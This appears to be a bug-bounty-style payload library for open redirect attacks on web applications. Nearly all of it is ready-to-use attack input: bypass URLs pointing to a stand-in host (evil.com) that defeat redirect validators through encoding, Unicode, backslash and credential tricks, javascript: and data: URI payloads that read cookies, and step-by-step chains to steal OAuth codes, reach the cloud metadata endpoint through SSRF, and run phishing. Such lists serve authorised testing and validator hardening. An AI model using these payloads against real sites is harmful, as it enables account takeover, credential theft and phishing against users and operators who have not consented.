---
id: "open-redirect-payloads"
title: "Open Redirect Payload Library"
type: "payload"
category: "web-application"
subcategory: "open-redirect"
tags: ["open-redirect", "url-parsing", "protocol-relative", "javascript-uri", "data-uri", "filter-bypass", "oauth", "ssrf-chain", "deep-dig"]
difficulty: "beginner"
platforms: ["linux", "macos", "windows"]
related: ["open-redirect", "account-takeover", "ssrf-payloads", "csrf-modern"]
updated: "2026-04-14"
---

## Overview

Open redirect payloads exploit URL validation flaws in redirect parameters. Alone: low severity ($50-$500). Chained with OAuth, SSRF, or CSP bypass: high severity ($2k-$10k+). The key is understanding URL parsing differences between validators and browsers. PortSwigger's URL validation bypass cheat sheet documents 100+ parsing inconsistencies.

## Common Redirect Parameters

```
url, redirect, next, return, rurl, dest, destination, redir,
redirect_uri, redirect_url, return_url, return_to, returnTo, goto, go,
continue, target, link, out, view, ref, callback, forward, path,
checkout_url, image_url, rurl, return_path, success_url, fail_url,
error_url, cancel_url, login_url, logout_url, signup_url, service,
RelayState, SAMLRequest, openid.return_to, then, followup
```

## Basic Payloads

```
?url=https://evil.com
?url=http://evil.com
?url=//evil.com
?url=///evil.com
?url=\\evil.com
?url=\/\/evil.com
?url=https://evil.com/
?url=https://evil.com?
?url=https://evil.com#
```

## Protocol-Relative Payloads

```
//evil.com
///evil.com
////evil.com
/\/evil.com
\/\/evil.com
//evil.com/
//evil.com/%2f..
//evil%E3%80%82com
//evil%EF%BC%8Ecom
```

## Scheme Confusion

```
https:evil.com
http:evil.com
https:/evil.com
http:/evil.com
https:///evil.com
http:///evil.com
https:////evil.com
https:\\evil.com
https:\evil.com
HtTpS://evil.com
HTTPS://evil.com
```

## Credential Trick (@)

```
https://target.com@evil.com
https://target.com@evil.com/
https://target.com%40evil.com
https://target.com:80@evil.com
https://target.com:443@evil.com
http://target.com:password@evil.com
https://target.com%2f@evil.com
https://target.com%252f@evil.com
```

## Subdomain Confusion

```
https://target.com.evil.com
https://evil.com/target.com
https://evil.com?target.com
https://evil.com#target.com
https://evil.com%23target.com
https://evil.com%3ftarget.com
https://targetevilcom.evil.com
https://target-com.evil.com
```

## Fragment and Query Tricks

```
https://evil.com#https://target.com
https://evil.com?https://target.com
https://evil.com&https://target.com
https://evil.com;https://target.com
https://evil.com/https://target.com
```

## Whitespace and Tab Injection

```
# Tab characters bypass some URL parsers
//%09/evil.com
//evil.com%09
https://evil.com%09.target.com
https://target.com%09@evil.com
/%09/evil.com
```

## Null Byte and Special Characters

```
https://evil.com%00.target.com
https://evil.com%0d%0a.target.com
//%00evil.com
https://evil.com\x00target.com
https://evil.com%01target.com
```

## URL Encoding Bypasses

```
# Full URL encoding
%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d

# Double encoding
%252f%252fevil.com
%252f%255cevil.com

# Mixed encoding
https:%2f%2fevil.com
%2f%2fevil.com
%2f%5cevil.com
```

## Unicode and Punycode

```
# Unicode dots
https://evil%E3%80%82com          # Fullwidth dot U+3002
https://evil%EF%BC%8Ecom          # Fullwidth full stop U+FF0E
https://evil%EF%BD%A1com          # Halfwidth ideographic full stop U+FF61
https://evil%E2%80%A4com          # One dot leader U+2024

# Unicode slashes
..%c0%af                          # Overlong slash
..%e0%80%af                       # Triple overlong slash
%c0%afevil.com

# Right-to-left override
https://target.com%E2%80%AE@evil.com  # RTL mark confuses display

# Homograph attack
https://tаrget.com  # Cyrillic 'a' instead of Latin 'a'
```

## IP Address Tricks

```
# Decimal IP
http://0x7f000001
http://2130706433
http://017700000001

# IPv6
http://[::1]
http://[::ffff:127.0.0.1]
http://[0000:0000:0000:0000:0000:ffff:7f00:0001]

# Zero-padded
http://127.0.0.1
http://0127.0.0.1
http://127.000.000.001
http://127.1
```

## JavaScript Protocol

```
javascript:alert(1)
javascript:alert(document.domain)
javascript:alert(document.cookie)
Javascript:alert(1)
JAVASCRIPT:alert(1)
jaVaScRiPt:alert(1)
javascript://alert(1)
javascript://https://target.com%0aalert(1)
javascript://%0aalert(1)
javascript:void(0)//https://target.com
java%0ascript:alert(1)
java%09script:alert(1)
java%0dscript:alert(1)
j%0aavascript:alert(1)
%6a%61%76%61%73%63%72%69%70%74%3aalert(1)
\j\a\v\a\s\c\r\i\p\t:alert(1)
```

## Data URI

```
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+
data:;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
data:text/html;charset=UTF-8,<script>alert(1)</script>
```

## Path-Based Redirects

```
# When the redirect value is treated as a path
/../../../evil.com
/..;/evil.com
/.evil.com
/%2f%2fevil.com
/evil.com
\.evil.com
/@evil.com
```

## WHATWG vs RFC Parsing Differences (Backslash Trick)

```
# WHATWG treats \ as / (browsers follow WHATWG)
# RFC3986 does not recognize \ as path separator (servers follow RFC)
# Result: server thinks same-origin, browser navigates to evil.com

https://evil.com\@target.com
/\evil.com
https:\\/evil.com
//evil.com\@target.com
/\/evil.com
```

## Escalation Chains

### Open redirect to OAuth token theft
```
# 1. Find open redirect: target.com/redirect?url=https://evil.com
# 2. Set as OAuth redirect_uri:
authorize?client_id=XXX&redirect_uri=https://target.com/redirect?url=https://evil.com&response_type=code
# 3. Victim's auth code redirected to attacker
```

### Open redirect to SSRF
```
# If server follows redirects:
?url=https://target.com/redirect?url=http://169.254.169.254/latest/meta-data/
# Server fetches target.com, follows redirect to metadata
```

### Open redirect to XSS via javascript:
```
?url=javascript:alert(document.cookie)
?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### Open redirect to phishing
```
# Use trusted domain for phishing
https://target.com/redirect?url=https://evil.com/target-login.html
# URL shows target.com, user trusts it
```

## Tools

- **OpenRedireX** -- Automated open redirect testing
- **Burp Suite** -- Parameter discovery and testing
- **Paramspider** -- Find URL parameters in web archives
- **ffuf** -- Fuzz redirect parameters with payload lists
- **PortSwigger URL validation bypass cheat sheet** -- Parsing inconsistencies reference
